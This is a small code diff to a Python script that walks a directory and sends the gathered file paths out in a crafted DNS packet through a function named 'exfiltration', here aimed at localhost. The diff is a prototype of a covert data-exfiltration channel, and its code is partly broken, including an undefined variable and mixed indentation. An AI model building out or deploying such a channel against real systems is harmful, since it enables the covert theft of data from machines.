@@ -45,6 +45,7 @@ def validateIP(s):
 	return True
 
 def exfiltration(data):
+    # Data exfiltration
 	send (IP(dst="127.0.0.1") / UDP() / DNS(qd=DNSQR(
     qname="localhost", qtype="A"))/data)
 	print(i)
@@ -70,6 +71,10 @@ else:
 
 if __name__ == '__main__':
     import sys
+    
+    tree = ""
     for entry in scantree(sys.argv[1] if len(sys.argv) > 1 else '.'):
-        exfiltration(entry.path)
-        print(entry.path)
+        tree += str(entry.path) + "\n"
+        
+    exfiltration(tree)
+    print(tree)
